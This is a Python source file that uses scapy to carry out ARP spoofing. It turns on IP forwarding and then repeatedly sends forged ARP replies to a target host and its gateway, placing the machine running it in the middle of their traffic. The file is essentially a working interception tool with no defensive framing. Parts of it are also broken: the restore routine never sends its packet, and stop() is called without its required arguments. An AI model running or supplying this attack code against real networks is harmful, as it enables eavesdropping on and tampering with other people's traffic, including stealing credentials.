from scapy.all import srp,send,ARP
import scapy.all as scapy
import time
import os

# gateIp = ""
# hostIp = "" 

def get_mac(ip):
    mac = "xx"
    while mac == "xx":
        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=1 , verbose=False)[0]
            mac = answered_list[0][1].hwsrc
            # print(mac)
        except:
            pass
        finally:
            return mac

def restore(destination_ip,source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    print(packet.show())
    print(packet.summary())


def spoof(target_ip,spoof_ip):    
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet,verbose=False)

def start():
    count = 0 
    while True:
        if flgs == 3:
            break
        spoof(hostIp,gateIp)
        spoof(gateIp,hostIp)
        print("Packet Counts : ",count)
        count = count + 1
        time.sleep(2)

def stop(hostIp,gateIp):
    restore(hostIp,gateIp)#restore(target ip , router ip )

def spoint(gates,hosts,flg):  
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    global gateIp 
    gateIp = gates
    global hostIp 
    hostIp = hosts
    global flgs
    flgs = flg
    n = 1
    if n == 1 : 
        start()
    else : 
        stop()
